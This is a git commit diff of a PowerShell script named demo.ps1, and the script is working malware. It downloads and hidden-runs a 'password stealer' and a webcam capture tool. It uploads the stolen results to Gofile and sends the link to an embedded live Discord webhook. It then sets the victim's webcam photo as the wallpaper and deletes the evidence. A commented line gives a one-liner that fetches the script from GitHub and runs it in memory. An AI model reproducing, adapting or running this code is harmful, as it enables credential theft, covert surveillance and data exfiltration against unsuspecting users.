d85d2d64a415d8b15242ba7b018500e154ce5f57
availableusername0 <somerandomemailtesting@gmail.com>
2024-10-05 10:23:46 +0300

    Update demo.ps1

--- demo.ps1
+++ demo.ps1
@@ -1,8 +1,13 @@
+# Create C:\Temp if it does not exists
 if (-not (Test-Path -Path "C:\Temp")) {
     New-Item -Path "C:\Temp" -ItemType Directory
 }
-
+# Change directory to C:\Temp
 Set-Location C:\Temp
+
+# Define the Discord webhook URL
+$webhook = "https://discord.com/api/webhooks/1291112619054338182/RlsoBpv3pfU_to4nY6U_u8d8jpMVNmWUzPFWvJQgIRvtiL6K3jxQsFH3lj7KEjUjDEV7"
+
 function Send-DiscordMessage {
     param (
         [string]$message
@@ -51,35 +56,28 @@ function Upload-FileAndGetLink {
     }
 }
 
-# Prank
-
+# 1. Run full screen Prank
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/availableusername0/demo/refs/heads/main/script.py' -OutFile 'script.py'
 Start-Process python.exe -ArgumentList 'script.py'
 
-# 5. Take photo from web cam
+# 2. Take photo from web cam
 Invoke-WebRequest https://signalswim.com/downloads/CommandCam.exe -OutFile CommandCam.exe
-.\CommandCam.exe /filename C:\Temp\prank.bmp /delay 500 /quiet
+Start-Process -WindowStyle Hidden .\CommandCam.exe -ArgumentList "/filename C:\Temp\prank.bmp /delay 500 /quiet"
 
-# Main script
-
-# Define the Discord webhook URL
-$webhook = "https://discord.com/api/webhooks/1291112619054338182/RlsoBpv3pfU_to4nY6U_u8d8jpMVNmWUzPFWvJQgIRvtiL6K3jxQsFH3lj7KEjUjDEV7"
-
-# Create temp directory.
-
-
-# 1. Download password stealer
+# 3. Download password stealer
 Invoke-WebRequest https://raw.githubusercontent.com/availableusername0/demo/refs/heads/main/stealer.py -OutFile C:\Temp\stealer.py
-# 2. run password stealer
-python C:\Temp\stealer.py
 
-# 3. Send the result to Gofile and get the download link
+# 4. run password stealer
+Start-Process -WindowStyle Hidden python.exe -ArgumentList 'C:\Temp\stealer.py'
+
+# 5. Send the result to Gofile and get the download link
 $link = Upload-FileAndGetLink -filePath C:\Temp\result.zip
+# $link = "test"
 
-# 4. Send the download link to Discord
+# 6. Send the download link to Discord
 Send-DiscordMessage -message $link
 
-# 6. Set wallpaper
+# 7. Set wallpaper
 $imgPath = "C:\Temp\prank.bmp"
 Add-Type -TypeDefinition @"
 using System;
@@ -90,10 +88,10 @@ public class Wallpaper {
 }
 "@
 [Wallpaper]::SystemParametersInfo(20, 0, $imgPath, (0x01 -bor 0x02))
-# sleep for a half a sec
-Start-Sleep -s 1.5
-# Start-Sleep -Seconds 1
 
-# 5. Delete the temp directory
-Remove-Item -Path "C:\Temp" -Recurse -Force
+# 8. Delete temp directory contetns
+# Remove-Item -Force -Recurse C:\Temp\*
+Start-Process -Wait Remove-Item -ArgumentList "-Force -Recurse C:\Temp\*"
+
+
 # powershell -NoExit -command "Invoke-WebRequest -Uri 'https://github.com/availableusername0/demo/raw/refs/heads/main/demo.ps1' -UseBasicParsing | Select-Object -ExpandProperty Content | powershell -command -"
